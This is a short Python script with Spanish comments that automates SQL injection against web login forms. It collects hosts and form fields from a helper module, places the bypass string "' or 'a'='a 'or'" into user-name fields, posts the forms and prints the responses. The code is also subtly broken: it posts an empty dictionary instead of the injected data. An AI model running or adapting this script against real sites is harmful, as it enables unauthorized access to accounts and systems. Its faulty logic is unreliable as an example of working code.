import sqlite3
import requests
from web import obtener_links

#Del archivo web.py usaremos la función "obtener_links"

def inject_sql():
    aux1 = obtener_links()

    for host, valores_nombres in aux1.items():
        for item in valores_nombres:
            payload = {}
            link = ''

            if isinstance(item, dict):  
                for name in item['names_values'].keys():
                    if any(p_name in name for p_name in ['user', 'usuario']):
                        item['names_values'][name] = "' or 'a'='a 'or'"
                        data = item['names_values']
                        link = item['action']
            elif isinstance(item, str):
                data={'usuario':"' or 'a'='a 'or'", 'password':''}
                link = item

            url = f'http://{host}/{link}/'

            try:
                with requests.Session() as s:
                    res = s.post(url, data=payload)
            except:
                print(f'Hubo un problema al conectarse a la página: {url}')
                continue

            if res.status_code == requests.codes.ok:
                print(res.text)
            else:
                print(res.text)


if __name__ == '__main__':
    inject_sql()